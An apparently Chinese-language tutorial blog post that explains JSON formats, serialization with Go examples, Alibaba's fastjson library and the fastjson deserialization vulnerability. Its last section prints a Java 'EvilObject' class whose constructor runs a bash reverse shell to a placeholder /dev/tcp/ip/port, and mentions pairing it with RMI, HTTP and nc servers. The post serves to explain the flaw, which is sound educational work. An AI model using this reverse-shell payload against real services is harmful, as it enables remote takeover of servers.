1、什么是JSON

直接引用网上的介绍

JSON的诞生原因是因为XML整合到HTML中各个浏览器实现的细节不尽相同，所以道格拉斯·克罗克福特（Douglas Crockford） 和 奇普·莫宁斯达（Chip Morningstar）一起从JS的数据类型中提取了一个子集，作为新的数据交换格式，因为主流的浏览器使用了通用的JavaScript引擎组件，所以在解析这种新数据格式时就不存在兼容性问题，于是他们将这种数据格式命名为 “JavaScript Object Notation”，缩写为 JSON，由此JSON便诞生了。

1.1 、JSON的两种格式

上面我们知道JSON是从JavaScript的数据类型中提取出来的子集，那JSON有几种结构形式呢？又有哪些数据类型呢？他们又分别对应着JavaScript中的哪些数据类型呢？

JSON有2种结构形式，键值对形式和数组形式。

键值对形式

举了一个JSON的实例，就是键值对形式的，如下：

{"person": {"name": "pig","age": "18","sex": "man","hometown": {"province": "江西省","city": "抚州市","county": "崇仁县" } }}

这种结构的JSON数据规则是：一个无序的“‘名称/值’对”集合。一个对象以 {左括号 开始， }右括号 结束。每个“名称”后跟一个 :冒号 ；“‘名称/值’ 对”之间使用 ,逗号 分隔。

因为大多数的时候大家用的JSON可能都是上面那种key-value形式，所以很多人在讲解JSON的时候总是会忽略数组形式，这一点是需要注意的。

数组形式

那JSON的数组形式是怎么样的呢？举一个实例吧！

["pig", 18, "man", "江西省抚州市崇仁县"]

数组形式的JSON数据就是值（value）的有序集合。一个数组以 [左中括号 开始， ]右中括号 结束。值之间使用 ,逗号 分隔。

2、序列化&反序列化

将内存中的数据变成可保存或可传输的数据的过程叫做序列化，在Python中叫pickling，在其他语言中也被称之为serialization，marshalling，flattening等等，都是一个意思。

反之，就是反序列化。

正常的序列化是将编程语言中的对象直接转成可保存或可传输的，这样会保存对象的类型信息，而JSON序列化则不会保留对象类型！

我用Golang写了一段代码来感受一下这一段解释。

将一个结构体JSON序列化：

package main
import (  "fmt"  "encoding/json")

type employee struct{  ID int  Name string  Age int  location string}
func main(){  s:=employee{10086,"zhangsan",33,"Beijing"}  fmt.Println("没有JSON化:",s)  fmt.Printf("%T \n",s)  jsoned, _ := json.Marshal(s)  fmt.Printf("JSON化之后：%s \n",jsoned)  fmt.Printf("%T \n",jsoned)}

这段代码的执行结果：

➜  Go-study go run json-go.go没有JSON化: {10086 zhangsan 33 Beijing}main.employeeJSON化之后：{"ID":10086,"Name":"zhangsan","Age":33}[]uint8

可以看到将结构体JSON化之后输出类型变成了[]uint8，即byte数组。对象类型果然没保留下来。。。。


我们再试试反序列化，即把byte数组变成一个结构体。这里我就偷懒了一下，直接用了GoDoc里的example代码

package main
import (  "fmt"  "encoding/json")

var jsonBlob = []byte(`[    {"Name": "Platypus", "Order": "Monotremata"},    {"Name": "Quoll",    "Order": "Dasyuromorphia"}  ]`)
type Animal struct {    Name  string    Order string}
func main(){  fmt.Printf("%s \n",jsonBlob)  fmt.Printf("%T \n",jsonBlob)  var animals []Animal  err := json.Unmarshal(jsonBlob, &animals)  if err != nil {    fmt.Println("error:", err)}
fmt.Printf("%+v \n", animals)fmt.Printf("%T \n",animals)
}

执行结果：

➜  Go-study go run unjson-go.go[    {"Name": "Platypus", "Order": "Monotremata"},    {"Name": "Quoll",    "Order": "Dasyuromorphia"}][]uint8[{Name:Platypus Order:Monotremata} {Name:Quoll Order:Dasyuromorphia}][]main.Animal


反序列化之后，byte数组变成了自定义的结构体struct。


3、什么是fastjson

直接看官方介绍：

https://github.com/alibaba/fastjson/wiki/Quick-Start-CN

fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。


速度快

fastjson相对其他JSON库的特点是快，从2011年fastjson发布1.1.x版本之后，其性能从未被其他Java实现的JSON库超越。

使用广泛

fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。

测试完备

fastjson有非常多的testcase，在1.2.11版本中，testcase超过3321个。每次发布都会进行回归测试，保证质量稳定。

使用简单

fastjson的API十分简洁。

String text = JSON.toJSONString(obj); //序列化 VO vo = JSON.parseObject("{...}", VO.class); //反序列化

功能完备

支持泛型，支持流处理超大文本，支持枚举，支持序列化和反序列化扩展。


这么看起来，比Go还简单啊。



4、什么是fastjson反序列化漏洞

业务代码接收的JSON数据交由Fastjson反序列化，攻击者通过精心构造JSON数据，影响Fastjson反序列化行为--反序列化特殊的类，进而发起网络情况、执行命令等。

考虑一个场景：您的服务提供一个Web API，接收用户的请求的数据，使用存在漏洞的Fastjson反序列化数据。攻击者就等同于获取一个Runtime.getRuntime().exec(command),command 由攻击者控制。


服务端正常的反序列化类：

String json = "{\"@type\":\"example.Product\",\"code\":\"w14014-p\",\"name\":\"seamin cookie\",\"price\":\"18.99\",\"description\":\"Low calorie, it's delicious.\"}";

攻击者期望执行的反序列化类:

public class EvilObject {    public EvilObject(){        try {            Runtime r = Runtime.getRuntime();            // 指定命令反弹shell            Process p = r.exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/port 0>&1"});            p.waitFor();        } catch (Exception e) {            e.printStackTrace();        }    }}


攻击者再配合本地RMI sever、HTTP server和NC完成反弹shell。
